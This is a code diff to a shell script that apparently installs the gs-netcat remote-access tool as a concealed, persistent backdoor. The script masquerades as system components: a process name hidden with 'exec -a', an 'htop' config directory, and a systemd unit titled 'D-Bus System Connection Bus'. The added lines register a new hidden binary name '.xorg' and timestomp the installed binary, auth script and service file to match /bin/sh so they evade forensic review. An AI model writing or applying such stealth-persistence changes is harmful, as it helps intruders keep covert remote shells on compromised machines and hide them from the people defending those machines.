@@ -90,7 +90,7 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 CONFIG_DIR_NAME="htop"
 
 # Names for 'uninstall' (including names from previous versions)
-BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
+BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" ".xorg" "gs-dbus" "gs-db")
 CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
 
 [[ -t 1 ]] && {
@@ -857,6 +857,7 @@ else
 fi
 AUTHEOF
 		chmod 700 "${AUTH_SCRIPT}"
+		touch -r /bin/sh "${AUTH_SCRIPT}" 2>/dev/null
 		GS_AUTH_EXTRA=" -e '${AUTH_SCRIPT}'"
 
 	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
@@ -1116,6 +1117,7 @@ install_system_systemd()
 	# Create the service file
 	mk_file "${SERVICE_FILE}" || return
 	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
+	touch -r /bin/sh "${SERVICE_FILE}" 2>/dev/null
 	echo "[Unit]
 Description=D-Bus System Connection Bus
 After=network.target
@@ -1489,6 +1491,7 @@ try()
 	echo -en "Copying binaries......................................................"
 	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 	chmod 700 "$DSTBIN"
+	touch -r /bin/sh "$DSTBIN" 2>/dev/null
 	OK_OUT
 
 	echo -en "Testing binaries......................................................"
